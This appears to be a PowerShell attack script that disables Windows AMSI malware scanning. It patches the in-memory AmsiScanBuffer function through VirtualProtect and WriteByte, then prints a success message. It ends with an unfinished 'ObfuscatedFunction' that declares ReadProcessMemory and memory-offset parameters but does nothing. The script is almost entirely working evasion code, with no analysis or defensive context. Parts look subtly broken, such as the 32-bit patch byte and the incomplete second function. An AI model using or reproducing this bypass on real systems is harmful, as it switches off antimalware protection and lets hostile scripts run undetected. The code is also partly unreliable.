# AMSI Bypass
$s = @"
using System;
using System.Runtime.InteropServices;
public class AmsiBypass {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $s

$a = [AmsiBypass]::LoadLibrary('amsi.dll')
$b = [AmsiBypass]::GetProcAddress($a, 'AmsiScanBuffer')
$p = [IntPtr]::Size -eq 8 ? 0xC3 : 0x33
[void][AmsiBypass]::VirtualProtect($b, [uint32]1, 0x40, [ref]0)
[System.Runtime.InteropServices.Marshal]::WriteByte($b, $p)

Write-Host "[*] AMSI bypass successfully applied."

# Function Declaration
function ObfuscatedFunction {
    param (
        $InitOffset = 0x50000,
        $NegOffset = 0x50000,
        $MaxOffset = 0x1000000,
        $ReadSize = 0x50000
    )
    $APIs = @"
using System;
using System.Runtime.InteropServices;
public class ObfAPIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesRead);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@
    Add-Type $APIs
}
